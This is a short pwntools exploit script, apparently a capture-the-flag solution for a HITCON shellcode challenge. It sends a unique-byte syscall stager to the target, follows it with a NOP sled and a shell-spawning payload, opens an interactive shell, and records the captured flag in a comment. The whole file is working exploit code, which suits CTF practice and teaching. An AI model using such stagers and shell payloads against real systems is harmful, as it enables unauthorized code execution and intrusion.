#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("13.112.180.65", 8361)
else:
    r = process("./re_easy_to_say-4d171ed2949ad2e9fcb5350c71aa80ec")

code = asm("""
c:
    syscall
    push rcx        # rcx = rip
    pop rsi
    mov dh, 0x10
    jmp c
""")

print disasm(code)

assert(len(code) == len(set(code)))

pause()
r.sendafter("Give me your code :", code)
r.send("\x90" * 100 + asm(shellcraft.sh()))
r.interactive()

# hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3} 
